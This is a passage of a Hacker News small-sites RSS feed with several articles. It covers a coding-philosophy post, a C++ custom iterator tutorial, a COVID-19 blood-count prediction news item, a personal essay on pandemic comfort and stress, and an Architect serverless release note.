<br/>
December 21, 2020 | https://www.brandonsmith.ninja/blog/write-code-not-too-much-mostly-functions | <a href="https://web.archive.org/web/*/https://www.brandonsmith.ninja/blog/write-code-not-too-much-mostly-functions">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody">
      

      

      

      


      <p>There's a well-known quote by author <a href="https://en.wikipedia.org/wiki/Michael_Pollan">Michael Pollan</a>:
        "Eat food. Not too much. Mostly plants." I like it because it doesn't
        attempt to be dogmatic: it encapsulates some basic guiding principles that get
        you 90% of the way there 90% of the time. Wikipedia describes the book the quote
        is from (emphasis mine):</p>
      <blockquote>
        <p>He explains...the notion that nutritionism and, therefore, the whole Western
          framework through which we intellectualize the value of food <strong>is more a religious
and faddish devotion to the mythology of simple solutions than a convincing and
reliable conclusion of incontrovertible scientific research</strong>.</p>
      </blockquote>
      <p>That...sounds familiar.</p>
      <h2 id="write-code">Write code </h2>
      <p>Code, like food, has value. I think those of us who write it can (hopefully)
        agree on that. Some, though, are so afraid of writing/eating
        <em>too much</em> that they avoid writing/eating what they should.</p>
      <p>In the context of programming, I think this translates to an unhealthy fear
        (again, for some) of duplication. A little bit of duplication - writing
        something in a way that doesn't completely maximize conciseness - isn't the end
        of the world. Sometimes it's the best path forward. Sometimes it's okay to
        copy-and-modify here and there, especially when you're still figuring out what
        your application will end up being.</p>
      <h2 id="not-too-much">Not too much </h2>
      <p>Of course too much code, like too much food, can also be a bad thing. This is
        a well-trodden topic so I don't feel the need to go too far into it here.</p>
      <p>Just be aware of your project's "appetite": write what needs to be written,
        and then try not to over-indulge.</p>
      <h2 id="mostly-functions">Mostly functions </h2>
      <p>By "functions" here I mean "pure functions". You could make a case that pure
        functions aren't the "plants" of code, though I feel
        that they are. In my experience most codebases have a pure functional
        subset, and I believe writing that subset in a pure-functional style is nearly
        always a win for the long-term health of the project.</p>
      <p>Of course the qualifier is "mostly": this isn't a dogma. Writing a 100%
        functional system ("going vegan", if you will) often requires you to jump
        through a bunch of extra hoops to get all the functionality you need. Looking
        at it solely from the perspective of health, those extra complications may not
        be worth it.</p>
      <p>And then different projects have different needs: just as an athlete may need
        a larger percentage of protein, or individuals may have certain nutrient
        deficiencies, a project may only have a very small functional subset, or may not
        be able to afford to return new values each time due to data size or
        performance-sensitivity. There's nothing wrong with that.</p>
      <h2 id="%22real-code%22">"Real code" </h2>
      <p>Pollan later qualifies his snappy statement a bit further:</p>
      <blockquote>
        <p>He contends that most of what Americans now buy in supermarkets, fast food
          stores, and restaurants is not in fact food, and that a practical tip is to eat
          only those things that people of his grandmother's generation would have
          recognized as food.</p>
      </blockquote>
      <p>At the risk of stretching the analogy, maybe the equivalent is
        "code only those things that people at a junior level would recognize for what
        they do". Code in simple, straightforward terms. Don't get too clever,
        "manufacturing artificial ingredients". Use the primitives that are there, when
        possible. Write what is simple, and natural, and human.</p>


    </article></div>]]>
            </description>
            <link>https://www.brandonsmith.ninja/blog/write-code-not-too-much-mostly-functions</link>
            <guid isPermaLink="false">hacker-news-small-sites-25500671</guid>
            <pubDate>Mon, 21 Dec 2020 22:53:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a custom iterator in modern C++]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25500563">thread link</a>) | @tblr
<br/>
December 21, 2020 | https://internalpointers.com/post/writing-custom-iterators-modern-cpp | <a href="https://web.archive.org/web/*/https://internalpointers.com/post/writing-custom-iterators-modern-cpp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>â€” Written by Triangles on December 13, 2020 
								â€¢ updated on December 19, 2020  
								â€¢ ID 86 â€”</p><p>An experimental Forward Iterator written from scratch to boost up hand-made containers.</p><div>
				
<!-- internalpointers responsive -->
<p>An iterator is an object that points to an element inside a container. Like a pointer, an iterator can be used to access the element it points to and can be moved through the content of the container. Each container in the C++ Standard Library provides its own iterator, as well as some methods to retrieve it. Using iterators is quite easy: obtain an instance from a container, move it around where needed and then get the pointed element.</p>
<p>Concretely, an iterator is a simple class that provides a bunch of operators: increment <code>++</code>, dereference <code>*</code> and few others which make it very similar to a pointer and the arithmetic operations you can perform on it. In fact, iterators are a generalization of pointers, which are often used as a foundation when writing the iterator itself.</p>
<p>Iterators are one of the building blocks of the Standard Library containers, but they are also useful when you want to provide the ability to iterate over elements of a custom container that you wrote yourself: this is what I want to investigate in the present article. Adding iterators to your containers will make them compatible with the <a href="https://en.cppreference.com/w/cpp/language/range-for">range-based for loops</a> and the <a href="https://en.cppreference.com/w/cpp/algorithm">C++ Algorithms library</a>: a collection of functions for searching, sorting, counting and manipulating containers, based on iterators.</p>
<h2>A dummy container for our experiments</h2>
<p>Before digging deeper, let's define a silly custom container that we want to spice up with iterators:</p>
<pre><code>class Integers
{
private:
    int m_data[200];
};
</code></pre>
<p>The <code>Integers</code> class is a wrapper around a raw array of <code>int</code>s: we want to be able to access elements of that private array through an iterator, as well as to loop over it or pass it to any of the Standard Library algorithms. Let's start by making some design decisions.</p>
<h2>Choose the nature of our iterator</h2>
<p>The first step is to choose the type of iterator we want to implement. Modern C++ defines six types:</p>
<table>
<thead><tr>
<th>#</th>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td><strong><a href="https://en.cppreference.com/w/cpp/named_req/InputIterator">Input Iterator</a></strong></td>
<td>Can scan the container forward only once, can't change the value it points to (read-only);</td>
</tr>
<tr>
<td>2</td>
<td><strong><a href="https://en.cppreference.com/w/cpp/named_req/OutputIterator">Output Iterator</a></strong></td>
<td>Can scan the container forward only once, can't read the value it points to (write-only);</td>
</tr>
<tr>
<td>3</td>
<td><strong><a href="https://en.cppreference.com/w/cpp/named_req/ForwardIterator">Forward Iterator</a></strong></td>
<td>Can scan the container forward multiple times, can read and write the value it points to;</td>
</tr>
<tr>
<td>4</td>
<td><strong><a href="https://en.cppreference.com/w/cpp/named_req/BidirectionalIterator">Bidirectional Iterator</a></strong></td>
<td>Same as previous one but can scan the container back and forth;</td>
</tr>
<tr>
<td>5</td>
<td><strong><a href="https://en.cppreference.com/w/cpp/named_req/RandomAccessIterator">Random Access Iterator</a></strong></td>
<td>Same as previous one but can access the container also non-sequentially (i.e. by jumping around);</td>
</tr>
<tr>
<td>6</td>
<td><strong><a href="https://en.cppreference.com/w/cpp/named_req/ContiguousIterator">Contiguous Iterator</a></strong></td>
<td>Same as previous one, with the addition that logically adjacent elements are also physically adjacent in memory.</td>
</tr>
</tbody>
</table>
<p>The six categories are hierarchical: a Bidirectional Iterator is also a Forward Iterator and a Random Access Iterator is both a Bidirectional and a Forward Iterator and so on. Normally, all iterators are Input Iterators (1) which makes them read-only, also known as <strong>constant iterators</strong>. Iterators that both support read and write operations are also Output Iterators (2) and are called <strong>mutable iterators</strong>.</p>
<div>
<p><img src="https://raw.githubusercontent.com/monocasual/internalpointers-files/master/2020/12/iterators/iterator-hierarchy.png" alt="Iterators hierarchy"></p><p>1. Iterators hierarchy in C++. All iterators are Input Iterators, Output Iterators or both.</p>
</div><p>Input and Output iterators are often used for low-level components such as input and output streams (the so-called <strong>single-pass algorithms</strong>) and thus have limitations. We want to do more with our custom container, so we will skip those two and jump straight to the mutable Forward Iterator.</p>
<h2>Prepare the custom iterator</h2>
<p>An iterator is usually declared inside the class it belongs to, for example:</p>
<pre><code>class Integers
{
public:
    struct Iterator { /* ... */ };

    // ...
};
</code></pre>
<p>The first thing to do is to assign the iterator some properties. Until C++17 this is done by <em>tagging</em> it with the <a href="https://www.fluentcpp.com/2018/04/27/tag-dispatching/"><strong>tag dispatch</strong></a> mechanism, while C++20 uses <strong>concepts</strong>: in this article I will follow the traditional approach.</p>
<p>C++ expects some properties from an iterator:</p>
<ul>
<li><code>iterator_category</code> â€” one of the six iterator categories we have seen above. The full list is available <a href="https://en.cppreference.com/w/cpp/iterator/iterator_tags">here</a>. The <code>std::forward_iterator_tag</code> tag is what we need;</li>
<li><code>difference_type</code> â€” a signed integer type that can be used to identify distance between iterator steps. Our iterator is basically a wrapper around a pointer and leverages pointer arithmetic, so the default <a href="https://en.cppreference.com/w/cpp/types/ptrdiff_t"><code>std::ptrdiff_t</code></a> is a good choice;</li>
<li><code>value_type</code> â€” the type the iterator iterates over. <code>int</code> in our case;</li>
<li><code>pointer</code> â€” defines a pointer to the type iterated over. <code>int*</code> in our case;</li>
<li><code>reference</code> â€” defines a reference to the type iterated over. <code>int&amp;</code> in our case;</li>
</ul>
<p>Translated into code:</p>
<pre><code>#include &lt;iterator&gt; // For std::forward_iterator_tag
#include &lt;cstddef&gt;  // For std::ptrdiff_t

struct Iterator 
{
    using iterator_category = std::forward_iterator_tag;
    using difference_type   = std::ptrdiff_t;
    using value_type        = int;
    using pointer           = int*;  // or also value_type*
    using reference         = int&amp;;  // or also value_type&amp;
};
</code></pre>
<h3>Why are tags useful?</h3>
<p>Some of the tags above might seem useless at first. In fact, you will notice how they will never get mentioned during the definition of our iterator. Tags are used to select the most efficient algorithm if your container is passed to one of the Standard Library functions from the <code>&lt;algorithm&gt;</code> library. Wrong tags mean sub-optimal performance! The iterator category is also used to set algorithm requirements, for example: <a href="https://en.cppreference.com/w/cpp/algorithm/fill"><code>std::fill</code></a> wants a Forward Iterator, while <a href="https://en.cppreference.com/w/cpp/algorithm/reverse"><code>std::reverse</code></a> wants a Bidirectional Iterator. Passing the wrong iterator will result in a compilation error.</p>
<h2>Define the iterator constructors</h2>
<p>All iterators must be <em>constructible</em>, <em>copy-constructible</em>, <em>copy-assignable</em>, <em>destructible</em> and <em>swappable</em>. Let's translate those requirements into code for our iterator:</p>
<pre><code>struct Iterator 
{
    // Iterator tags here...

    Iterator(pointer ptr) : m_ptr(ptr) {}

private:

    pointer m_ptr;
};
</code></pre>
<p>Easy! We just need a custom constructor to initialize the private member variable <code>m_ptr</code>, which points to an element of the <code>Integers</code> container. The custom constructor satisfies the <em>constructible</em> requirement, while all others are covered by the implicitly-declared constructors and operators kindly provided by the compiler.</p>
<h2>Implement operators</h2>
<p>We are building a mutable Forward Iterator, which inherits properties from both Input and Output Iterators. The resulting iterator must support the following operations:</p>
<ul>
<li><code>*iterator</code> and <code>iterator-&gt;x</code> â€” dereferenceable, to get the value it points to;</li>
<li><code>++iterator</code> and <code>iterator++</code> â€” incrementable, to move it one step forward, both prefix and postfix versions. The latter must return something dereferenceable;</li>
<li><code>iterator_a == iterator_b</code> and <code>iterator_a != iterator_b</code> â€” comparable with another iterator;</li>
</ul>
<p>This is done by implementing some custom operators in the <code>Iterator</code> class, like this:</p>
<pre><code>struct Iterator 
{
    // Iterator tags here...

    // Iterator constructors here...

    reference operator*() const { return *m_ptr; }
    pointer operator-&gt;() { return m_ptr; }

    // Prefix increment
    Iterator&amp; operator++() { m_ptr++; return *this; }  

    // Postfix increment
    Iterator operator++(int) { Iterator tmp = *this; ++(*this); return tmp; }

    friend bool operator== (const Iterator&amp; a, const Iterator&amp; b) { return a.m_ptr == b.m_ptr; };
    friend bool operator!= (const Iterator&amp; a, const Iterator&amp; b) { return a.m_ptr != b.m_ptr; };     

private:

    pointer m_ptr;
};
</code></pre>
<p>As you can see every operator involves the usage of the private pointer <code>m_ptr</code>. Also, notice the <code>friend</code> declaration for the two comparison operators: this is handy way to define the operators as non-member functions, yet being able to access private parts of the <code>Iterator</code> class (rationale  <a href="https://stackoverflow.com/questions/4421706/what-are-the-basic-rules-and-idioms-for-operator-overloading/4421729#4421729">here</a>).</p>
<h2>Prepare the container</h2>
<p>Our iterator is good to go. The last step is to give our custom container the ability to create <code>Iterator</code> objects. This is done by adding two public methods <code>begin()</code> and <code>end()</code> that return instances of the <code>Iterator</code> class, representing the first and the last element respectively:</p>
<pre><code>class Integers
{
public:

    // Iterator definition here ...

    Iterator begin() { return Iterator(&amp;m_data[0]); }
    Iterator end()   { return Iterator(&amp;m_data[200]); } // 200 is out of bounds
};
</code></pre>
<p>The <code>end()</code> method returns an iterator that refers to an <em>invalid</em> memory address, past the end of our raw array. Such iterator is just a placeholder used to determine when the boundary has been reached: it should never be accessed directly.</p>

<!-- internalpointers responsive -->
<h2>Time to test our iterator</h2>
<p>Both the custom container and its iterator are now ready. Let's test them with the range-based for loop:</p>
<pre><code>Integers integers;
for (auto i : integers)
    std::cout &lt;&lt; i &lt;&lt; "\n";
</code></pre>
<p>This code will magically print the value of each integer in the container. It works because the range-based for loop is just syntactic sugar created by the compiler for the following:</p>
<pre><code>for (auto it = integers.begin(), end = integers.end(); it != end; ++it) { 
    const auto i = *it; 
    std::cout &lt;&lt; i &lt;&lt; "\n";
}
</code></pre>
<p>In words: two iterators <code>it</code> and <code>end</code> are created. The first one points to the beginning of the container, the other one points to the end. Then, on each loop, the <code>it</code> iterator is incremented until it's equal to <code>end</code>, that is until the end of the container has been reached. The actual value is obtained by dereferencing <code>it</code> in a local variable before being printed.</p>
<p>Notice how the compiler makes use of all the operators and functions we have previously implemented: the <code>begin()</code> and <code>end()</code> methods in the custom container, the ability to compare the two iterators with the <code>!=</code> operator, the ability to increment <code>it</code> with the prefix syntax and finally the ability to dereference it to grab the actual value it points to.</p>
<p>Let's now try a function from the Algorithm library, <a href="https://en.cppreference.com/w/cpp/algorithm/fill"><code>std::fill</code></a> for example:</p>
<pre><code>Integers integers;

std::fill(integers.begin(), integers.end(), 3);
</code></pre>
<p>The function assigns all elements in the container the value <code>3</code>. It works because <code>std::fill</code> is usually implemented like this:</p>
<pre><code>template &lt;typename ForwardIterator, â€¦</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://internalpointers.com/post/writing-custom-iterators-modern-cpp">https://internalpointers.com/post/writing-custom-iterators-modern-cpp</a></em></p>]]>
            </description>
            <link>https://internalpointers.com/post/writing-custom-iterators-modern-cpp</link>
            <guid isPermaLink="false">hacker-news-small-sites-25500563</guid>
            <pubDate>Mon, 21 Dec 2020 22:43:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A full blood count of Covid-19 patients could predict disease severity]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25500537">thread link</a>) | @finphil
<br/>
December 21, 2020 | https://nuadox.com/post/638153014113370112/full-blood-count-covid19-prediction | <a href="https://web.archive.org/web/*/https://nuadox.com/post/638153014113370112/full-blood-count-covid19-prediction">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="638153014113370112">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/638153014113370112/full-blood-count-covid19-prediction"><h2>A full blood count of COVID-19 patients could predict disease severity</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1070"><img src="https://64.media.tumblr.com/f62c11a7b8380d973c89a0f8b2e19be4/7eaa33c312b31484-c4/s1280x1920/eaa8739dee2bddd12b02049f0462be5b4ee4a9af.jpg" alt="image" data-orig-width="1920" data-orig-height="1070" width="1280" height="713"></figure><p><b>- By&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.radboudumc.nl%2Fen%2F&amp;t=NTEwNmQ3MjUxMmZkOWRiZjVlOGIwZDc2NjJiNDE0NjVkOGExMWY0YyxPdnJTNlR3WA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638153014113370112%2Ffull-blood-count-covid19-prediction&amp;m=0&amp;ts=1608871560">Radboud University Medical Center</a> -</b></p><p>International research led by the Radboud university medical center in the Netherlands shows that a full blood count of COVID-19 patients predicts fairly accurately whether the infection will have a complicated course or not. This could make it easier for healthcare providers to estimate the expected clinical picture.</p><p>This study, conducted in eleven hospitals, has now been published in the scientific journal <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Felifesciences.org%2Farticles%2F63195&amp;t=ODVmZTcxNzVlYWE5OTc2ZDk3ZDc3MWNkN2ZkZWQ5MmUwZjY2NmE5ZSxPdnJTNlR3WA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638153014113370112%2Ffull-blood-count-covid19-prediction&amp;m=0&amp;ts=1608871560"><i>eLife</i></a>.</p><p>In patients presenting to hospitals with a COVID-19 infection, full blood count analysis (hemocytometry) are commonly performed at the emergency department and during hospitalization. COVID-19 is accompanied by specific changes in the circulating blood cells that are analyzed by a full blood count. These changes in the blood cells, especially those that can be identified using new techniques, are used to create an algorithm with a predictive value. The developed algorithm appears to predict the course of COVID-19 better than the value of the individual blood cells, as used so far. The reliability increases to 93% after six days.</p><h2><b>Predicting disease progression</b></h2><p>Using data generated by full blood count measurements, the researchers wanted to know whether it is possible to predict whether a hospitalized COVID-19 patient will become seriously ill and needs treatment at the Intensive Care. For this purpose, they examined the data of 982 adult patients in eleven different hospitals across Europe. And this turned out to be possible: specific changes in the circulating blood cells of COVID-19 patients proved to be of use as indicators whether a serious course of events was expected. New laboratory techniques make it possible to detect whether immune cells in the blood are activated and it turned out that especially these activated cells were more present of COVID-19 patients with a severe course, including during the early course of the disease. In a second study population the researchers were able to confirm the value of the prognostic score.</p><h2><b>Cheap and available</b></h2><p>Internist-infectiologist and principal investigator AndrÃ© van der Ven of Radboud university medical center explains: â€œA full blood count is a fully automated, inexpensive, immediately available measurement and one of the most requested laboratory determinations in the world. Full blood count measurements are also routinely requested from COVID-19 patients who present to the hospital. By using certain techniques, the character of certain blood cells can be better determined and by using these new techniques, we have been able to develop a reliable prognostic score. This score gives a good insight into whether a serious course of events can be expected and can help healthcare professionals to make treatment decisionsâ€.</p><p>â€“</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.radboudumc.nl%2Fen%2Fnews-items%2F2020%2Ffull-blood-count-covid-19-patients-predict-disease-severity&amp;t=ZWY2OGZiMTFjYzBmNDg5ZTljM2QyMzcwZmI5ODU0NWM2Mjk2MmVmOSxPdnJTNlR3WA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638153014113370112%2Ffull-blood-count-covid19-prediction&amp;m=0&amp;ts=1608871560">Radboud University Medical Center</a></b></p><p><b>Full study:</b>&nbsp;â€œA novel haemocytometric COVID-19 prognostic score developed and validated in an observational multicentre European hospital-based studyâ€, <i>eLife</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.7554%2FeLife.63195&amp;t=MTk2ZjFhOWZhOGMxNTYyOWZjZjdiZjU0OTJmOGU4NDBlOWU0ZTFmNixPdnJTNlR3WA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638153014113370112%2Ffull-blood-count-covid19-prediction&amp;m=0&amp;ts=1608871560">https://doi.org/10.7554/eLife.63195</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/632175500576653312/blood-test-covid19-infection-prediction">Novel blood test predicts which COVID-19 patients will develop severe infection</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/covid19">covid19</a>
                                    
                                        <a href="https://nuadox.com/tagged/coronavirus">coronavirus</a>
                                    
                                        <a href="https://nuadox.com/tagged/pandemic">pandemic</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/medicine">medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/virus">virus</a>
                                    
                                    </p>
                                </span></p>
                                
<ol><!-- START NOTES --><!-- END NOTES --></ol></div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/638153014113370112/full-blood-count-covid19-prediction</link>
            <guid isPermaLink="false">hacker-news-small-sites-25500537</guid>
            <pubDate>Mon, 21 Dec 2020 22:39:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Stress and Comfort]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25500461">thread link</a>) | @greenrd
<br/>
December 21, 2020 | https://www.spakhm.com/p/on-stress-and-comfort | <a href="https://web.archive.org/web/*/https://www.spakhm.com/p/on-stress-and-comfort">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Many people report they're feeling depressed during the pandemic. The gyms are closed so exercise options are limited. You don't get to see people as much. The routines are all differentâ€” you might have lost touch with friends, there are no serendipitous conversations at work, you can't go out to a restaurant or to see a movie. That would put anybody in low spirits.</p><p>But not me. I'm extremely well adapted to the pandemic. I can busy myself with reading, studying or programming and almost never get bored. Chatting over text feels as real to me as meeting in person. In many ways text is <em>betterâ€”</em> I can multitask, talk to different groups of friends, be in my pajamas. I don't miss going out. Restaurants are filled with annoyances like noise and waiting for the check. The food delivery experience feels strictly better. I don't have to sit in traffic or go to events I never liked. The new routine has made me surprisingly happy.</p><p>Because I spend so much time at home I made everything cozy. I'm surrounded by my favorite books. I get the exact amount and the type of light I need (which is dim and incandescent orange). I get more and better sleep, the kitchen is stocked with the food I like, the pajamas are soft. I can take baths in the middle of the day! There is good coffee. People get to control only some aspects of our environment, but now my home <em>is</em> the environment. I get to control all of it. I can't remember a time when I was as comfortable.</p><p>Comfort begets comfort. I've always said no to unnecessary errands, but the pandemic made it clear how much further that can go. If I was too conservative saying no before, could I be too conservative saying it now? I tested it, and it turned out that I was. For example, when people asked for Zoom I tried saying "let's work it out over text". And that turned out to be enough! I've always preferred conversations to meetings, and text feels far more conversational than Zoom. Now people know to reach me via text. Over the last six months I've eliminated nearly everything I don't want to do.</p><p>One outcome of this experiment is tranquility. The other is that I get more done than ever. I read, write, study, code and talk to people <em>more</em> than I did before. I can't remember the last time I sat down and read for two uninterrupted hours before the pandemic. Now I do it regularly. The combination of extra time, fewer interruptions, and less frustration feels like I'm operating at a lower frequency. This frequency feels optimal for productivity. The frequency prior to the pandemic was far too high.</p><p>But there are negative side effects to comfort. I find myself saying no where I should be saying yes. Less physical movement means it's harder to keep a healthy weight. Lack of strenuous exercise makes me downright lazyâ€” I notice myself resisting anything that would cause even small amounts of stress. I don't lose a sense of urgency, but I do find it harder to convince myself to perform entire classes of work. None of this makes me unhappy. My limbic system is ok with it, but the rational part of my brain knows these effects aren't good for me. They remind me of an excerpt from Kahlil Gibran:</p><blockquote><p>    Or have you only comfort, and the lust for comfort, that stealthy thing that enters the house a guest, and then becomes a host, and then a master?</p><p>    Ay, and it becomes a tamer, and with hook and scourge makes puppets of your larger desires.<br>    Though its hands are silken, its heart is of iron.<br>    It lulls you to sleep only to stand by your bed and jeer at the dignity of the flesh.<br>    It makes mock of your sound senses, and lays them in thistledown like fragile vessels.<br>    Verily the lust for comfort murders the passion of the soul, and then walks grinning in the funeral.</p><p>    But you, children of space, you restless in rest, you shall not be trapped nor tamed.<br>    Your house shall be not an anchor but a mast.</p></blockquote><p>So it isn't enough to be comfortable. Comfort needs to be balanced with stress. What type of stress is the right stress? I'm still experimenting, but I have early results. This is <code>N=1</code> and I don't know if the conclusions generalize. YMMV.</p><p>High intensity interval training (HIIT) always lifts my mood, gives me more energy, and makes it much easier to take on the day or to handle bad news. The stock market tanking is bad,  but not nearly as bad if you did twenty minutes of burpees. This effect is stronger after doing martial arts. I don't know yet if it's because the intensity is higher and longer, or because there is a social component. I noticed I don't get any of these effects after long slow runs, or after lifting heavy weights. I am not sure why.</p><p>Cold water has roughly the same psychological effects on me as HIIT. The effects plateau after about fifteen seconds under a cold shower. It works much better if the head and face are under the stream. There is effect without that, but it's more limited. I haven't looked at the data and I don't know if this is safe to do consistently. People make all sorts of pseudoscientific claims about health benefits of cold waterâ€” I'm not doing that; I just know it has an effect on my psychology.</p><p><a href="https://en.wikipedia.org/wiki/SMART_criteria">SMART</a> goals have incredibly powerful effects, but only with an additional propertyâ€” I have to care about the goal. If I have to ship a feature by Monday and I care about the product, I will be focused and excited all through the weekend. It works even better if I know other people are depending on me. But the inverse, if people depend on me but I don't care about the goal, is destructive stress. Those situations make me miserable beyond belief.</p><p>Sleep matters a lot, and it's surprisingly fussy. About 8.5 hours is optimal. Less than 8 or more than 9 leaves me grumpy for the rest of the day.</p><p>I found that contrary to conventional wisdom diet quality makes no difference. I can eat pizzas all day or healthy gourmet mealsâ€” if I get the calories in it doesn't matter. On the other hand my weight does matter. About 165lbs (the uppermost point of my healthy BMI) is optimal. Any less and I start feeling weak. More than 175lbs and my mood starts to suffer. Meditation, supplements, and proximity to nature also don't matter.</p><p>I have a much longer list of how different conditions affect me, but from talking to friends I know these mappings are idiosyncratic. The meta argument is that tinkering with the right and wrong types of comfort and stress can make a dramatic difference on your productivity and subjective experience. It doesn't even require much work! You have to pay attention to how your psychology responds to situations and be willing to make changes. After a while it becomes automatic. And since your life situation and priorities change with time, the tinkering process never ends.</p></div></div>]]>
            </description>
            <link>https://www.spakhm.com/p/on-stress-and-comfort</link>
            <guid isPermaLink="false">hacker-news-small-sites-25500461</guid>
            <pubDate>Mon, 21 Dec 2020 22:32:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Auth Made Easy: FusionAuth Review]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25500321">thread link</a>) | @mooreds
<br/>
December 21, 2020 | https://www.gmork.tech/blog/2 | <a href="https://web.archive.org/web/*/https://www.gmork.tech/blog/2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.gmork.tech/blog/2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25500321</guid>
            <pubDate>Mon, 21 Dec 2020 22:20:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Architect 8.4: say hello to Lambda treeshaking]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25500305">thread link</a>) | @brianleroux
<br/>
December 21, 2020 | https://blog.begin.com/architect-8-4-say-hello-to-lambda-treeshaking-898bf5008c70 | <a href="https://web.archive.org/web/*/https://blog.begin.com/architect-8-4-say-hello-to-lambda-treeshaking-898bf5008c70">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@ryan?source=post_page-----898bf5008c70--------------------------------" rel="noopener"><img alt="Ryan Block" src="https://miro.medium.com/fit/c/96/96/2*EfV_5cNqDQE8MFejOm6FKg.png" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1996/0*xCxxLQouKeUJLD2b.png" width="998" height="182" srcset="https://miro.medium.com/max/552/0*xCxxLQouKeUJLD2b.png 276w, https://miro.medium.com/max/1104/0*xCxxLQouKeUJLD2b.png 552w, https://miro.medium.com/max/1280/0*xCxxLQouKeUJLD2b.png 640w, https://miro.medium.com/max/1400/0*xCxxLQouKeUJLD2b.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*xCxxLQouKeUJLD2b.png?q=20"></p></div></div></div></figure><p id="e7ed">One of the thing that sets OpenJS Architect apart from other serverless tools is its opinion that serverless apps work best when composed of many small, discrete Lambda cloud functions.</p><p id="ce55">This approach offers the greatest coldstart performance, security isolation, deployment speed, and mean time to bug resolution. However, this approach also comes with a minor drawback: the need to manage many Lambdasâ€™ dependencies.</p><p id="7083">Or at least it used to! Architect 8.4 introduces a new concept we call Lambda Node.js modules treeshaking.</p><h2 id="3e13">How Lambda treeshaking works</h2><p id="a062">If youâ€™d like to take advantage of the nearly 1.5 million publicly published Node.js modules, your Architect app may have numerous individual <code>package.json</code> files spread across its various Lambdae. Hereâ€™s an example file tree of how such a project might look:</p><pre><span id="2740">/<br>â”œâ”€ src/<br>â”‚  â””â”€ http<br>â”‚     â”œâ”€ get-index<br>â”‚     â”‚  â”œâ”€ index.js<br>â”‚     â”‚  â””â”€ package.json<br>â”‚     â”œâ”€ post-api<br>â”‚     â”‚ â”œâ”€ index.js<br>â”‚     â”‚ â””â”€ package.json<br>â”‚     â””â”€ put-api<br>â”‚        â”œâ”€ index.js<br>â”‚        â””â”€ package.json<br>â”œâ”€ app.arc<br>â””â”€ package.json</span></pre><p id="3adc">Architect 8.4â€™s Lambda Node.js modules treeshaking now automatically statically analyzes all of your Lambdasâ€™ business logic and manages each of their dependencies from the root. This means:</p><ul><li id="2067">You only ever have to install dependencies one time in one place: your root <code>package.json</code></li><li id="a93c">Similarly, upgrading, removing, or otherwise maintaining dependencies happens in your root as well</li><li id="388e">Perhaps our favorite: no more having to keep dozens (or hundreds) of individual <code>package[-lock].json</code> files in your repo</li></ul><p id="ddab">Now the project above looks like this:</p><pre><span id="2f19">/<br>â”œâ”€ src/<br>â”‚  â””â”€ http<br>â”‚     â”œâ”€ get-index<br>â”‚     â”‚  â””â”€ index.js<br>â”‚     â”œâ”€ post-api<br>â”‚     â”‚  â””â”€ index.js<br>â”‚     â””â”€ put-api<br>â”‚        â””â”€ index.js<br>â”œâ”€ app.arc<br>â””â”€ package.json</span></pre><h2 id="c769">Get started with Lambda treeshaking</h2><p id="a614">For starters, make sure youâ€™re running Architect 8.4 (<code>npm i @architect/architect@latest</code>)!</p><p id="4815">For new projects, taking advantage of Lambda treeshaking is as simple as adding dependencies to your projectâ€™s root <code>package.json</code> file (and <code>require()</code>ingÂ¹ them in your business logic).</p><p id="2815">For existing projects, any Lambdas that already have their own <code>package.json</code> will continue to have their dependencies wholly managed by you, meaning you can choose 